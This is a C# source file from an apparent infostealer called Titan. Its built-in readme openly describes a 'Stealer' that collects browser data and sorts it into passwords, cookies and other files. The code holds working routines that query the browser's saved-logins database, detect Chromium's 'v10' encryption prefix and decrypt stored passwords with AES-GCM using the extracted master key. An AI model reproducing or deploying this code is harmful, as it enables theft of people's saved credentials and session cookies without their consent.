using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Text;

namespace Titan.Socket.Analyzer
{
    internal class AnalyzerUtils
    {
        public static string[] GetLogo(string type)
        {
            return new string[]
            {
                 " /$$$$$$$$ /$$$$$$ /$$$$$$$$ /$$$$$$  /$$   /$$",
                 "|__  $$__/|_  $$_/|__  $$__//$$__  $$| $$$ | $$",
                 "   | $$     | $$     | $$  | $$  \\ $$| $$$$| $$",
                 "   | $$     | $$     | $$  | $$$$$$$$| $$ $$ $$",
                 "   | $$     | $$     | $$  | $$__  $$| $$  $$$$",
                 "   | $$     | $$     | $$  | $$  | $$| $$\\  $$$",
                 "   | $$    /$$$$$$   | $$  | $$  | $$| $$ \\  $$",
                 "   |__/   |______/   |__/  |__/  |__/|__/  \\__/",
                 "",
                 $"Log -- {type}"
            };
        }

        public static string[] GetReadme()
        {
            string[] logo = GetLogo("Machine Profile");
            string[] line = new string[]
            {
                "Stealer take a browsers data and put them to named folders.",
                "After receive a some browser data, stealer start analyzing the data and create sorted files like Passwords, Cookies and etc...",
                "You can take it self and analyze it with MasterKey file contained in any browser folder here",
                "IMPORTANT! Key saved in base64, you can decode it and use!",
                "Enjoy!"
            };

            var content = new string[logo.Length + line.Length];
            logo.CopyTo(content, 0);
            line.CopyTo(content, logo.Length);

            return content;
        }

        public static bool IsV10(byte[] data)
        {
            if (Encoding.UTF8.GetString(data.Take(3).ToArray()) == "v10")
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public static string Query()
        {
            return "select * from logins";
        }

        public static string DynamicDecrypt(byte[] encryptedPass, byte[] key, int payloadOffset = 15, int nonceBegin = 3, int nonceEnd = 15)
        {
            if (encryptedPass.Length < 3)
            {
                return "Empty";
            }

            return DynamicDecryptInternal(encryptedPass[payloadOffset..], key, encryptedPass[nonceBegin..nonceEnd]);
        }

        public static string DynamicDecryptInternal(byte[] encryptedPass, byte[] key, byte[] nonce)
        {
            string sR;

            try
            {
                GcmBlockCipher cipher = new(new AesEngine());
                AeadParameters parameters = new(new KeyParameter(key), 128, nonce, null);

                cipher.Init(false, parameters);
                byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedPass.Length)];
                int retLen = cipher.ProcessBytes(encryptedPass, 0, encryptedPass.Length, plainBytes, 0);
                cipher.DoFinal(plainBytes, retLen);

                sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
            }
            catch
            {
                return "Not Decrypted";
            }

            return sR;
        }
    }
}
